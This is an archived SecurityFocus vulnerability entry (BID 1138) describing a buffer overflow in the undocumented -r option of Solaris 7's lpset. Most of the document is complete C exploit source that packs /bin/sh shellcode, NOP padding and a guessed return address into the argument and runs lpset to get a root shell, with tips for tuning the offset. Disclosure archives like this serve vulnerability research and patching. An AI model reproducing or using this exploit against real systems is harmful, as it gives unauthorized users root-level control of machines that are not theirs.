source: http://www.securityfocus.com/bid/1138/info

A vulnerability exists in the handling of the -r option to the lpset program, as included in Solaris 7 from Sun Microsystems. The -r option is undocumented. As such, its use in unknown. However, when supplied a well crafted buffer containing executable code, it is possible to execute arbitrary commands as root.

/*  
 *
 * solaris 2.7 lpset local exploit, i386.
 * discovered by: duke 
 * not the same as on bt.
 * if exploit dosen=B4t work try offset from 300-450
 *
 * greets: duke, #!ADM, #!security.is, #hax
 *
 * DiGiT - teddi@linux.is
 *  
*/

    
#include <unistd.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h> 

char shellcode[] =
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";
 
long get_esp() { __asm__("movl %esp,%eax"); }
 
int main (int argc, char *argv[]) {
 
    long offset=410;
    int nop=64;
    int gab=40;
    long addr;
    char buffer[210];
    int i, a, b;   

if (argc > 1) offset = strtol(argv[1], NULL, 0);
if (argc > 2) gab = strtol(argv[2], NULL, 0);
if (argc > 3) nop = strtol(argv[2], NULL, 0);
 
   for (a = 0; a <gab; a++)
        buffer[a] = 'A';
 
  addr = get_esp() + offset;
 
  buffer[a++] = addr & 0x000000ff;
  buffer[a++] = (addr & 0x0000ff00) >> 8;  
  buffer[a++] = (addr & 0x00ff0000) >> 16;
  buffer[a++] = (addr & 0xff000000) >> 24;
 
  for ( ; a < nop; a++)
    buffer[a] = 0x90;
    
  for (b = 0; b < strlen(shellcode); b++, a++)
    buffer[a] = shellcode[b];
    
  buffer[strlen(buffer)] = '\0';

        printf("addr = 0x%x\n", addr);
        execl("/usr/bin/lpset", "lpset", "-n", "fns", "-r", buffer,"digit", NULL);
   
}       